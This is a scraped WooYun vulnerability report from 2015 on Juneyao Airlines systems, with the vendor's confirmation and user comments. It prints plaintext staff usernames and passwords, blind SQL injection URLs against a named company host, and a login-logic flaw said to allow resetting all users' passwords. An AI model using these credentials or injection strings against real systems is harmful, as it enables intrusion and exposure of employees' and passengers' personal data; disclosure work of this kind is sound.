{"id": 71712, "wybug_id": "wooyun-2015-0147730", "wybug_title": "航空安全之吉祥航空弱口令\\SQL注入\\奇葩逻辑等漏洞打包提交(泄漏员工通讯录\\进入多个系统\\大量敏感信息)", "wybug_corp": "juneyaoair.com", "wybug_author": "harbour_bin", "wybug_date": "2015-10-19 11:54", "wybug_open_date": "2015-12-07 09:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧", "弱密码", "逻辑漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-07：\t细节向公众公开  简要描述： RTPS：危害很大, 厂商注意了, 不想分开提交了, 求20rank 详细说明：  1、弱口令问题\nhttp://crewinternal.juneyaoair.com:65/\n存在验证码, 识别OCR进行测试, 得到以下帐号\nwangyu 888888wangyusen a1234567youxiaozhi a1234567\n危害证明,仅截部分证明, 危害你们知道的\n\n内部通讯录\n\n航班信息\n\n身份证、护照等信息\n\n2、未授权访问+SQL注入\nhttp://sms.juneyaoair.com:9080/SMSNEW/oa!aircrewLogin?username=BaiNingKai&airuser.aircrewName=BaiNingKai&airuser.aircrewDepartment.aircrewDeptCode=FL17\n此处未授权访问airuser.aircrewDepartment.aircrewDeptCode处存在SQL注入手动注入：\nhttp://sms.juneyaoair.com:9080/SMSNEW/oa!aircrewLogin?username=BaiNingKai&airuser.aircrewName=BaiNingKai&airuser.aircrewDepartment.aircrewDeptCode=FL17' and substring(database(),1,6)=char(115,109,115,110,101,119) and '1'='1\n数据库名：smsnem\nhttp://sms.juneyaoair.com:9080/SMSNEW/oa!aircrewLogin?username=BaiNingKai&airuser.aircrewName=BaiNingKai&airuser.aircrewDepartment.aircrewDeptCode=FL17' and length(user())=18 and '1'='1\n证明一下：\n\n3、业务逻辑漏洞此处还存在一次很奇葩的逻辑问题, 接下来我们利用这个登录sms系统, let's go!进行绑定, 绑定成功后会显示出错(其实已经成功绑定), 再次绑定后显示为用户名已经存在, 测试发现成功\n\n第二次\n\n成功登录\nhttp://sms.juneyaoair.com:9080/SMSNEW/\n\n用户名BaiNingKai 密码bnk123\n\n\n里面存在大量敏感信息, 证明一下\n\n\n\n4、危害扩大该处的逻辑漏洞结合第一处的通讯录, 可重置所有用户的密码; 同时, 可结合通讯录重新进行爆破, 危害不言而喻！   漏洞证明：  另外一个帐号, 昨晚测试的\n\nPS：危害不够可补充, 谢谢   修复方案：  你们更专业！   版权声明：转载请注明来源 harbour_bin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-23 09:21 厂商回复： 漏洞确认 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-19 12:54 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  散    \n     2015-10-19 12:54 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  赞    \n     2015-10-19 12:59 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1234 漏洞数:122        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  页面都撑坏了。。。    \n     2015-10-19 14:08 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:59        | 沉淀一下, 好好研究一些东西...)\t\t \n  @子非海绵宝宝 屏幕太小不说话    \n     2015-10-20 20:49 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:59        | 沉淀一下, 好好研究一些东西...)\t\t \n  @juneyaoair.com 东西改了, 确认一下吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}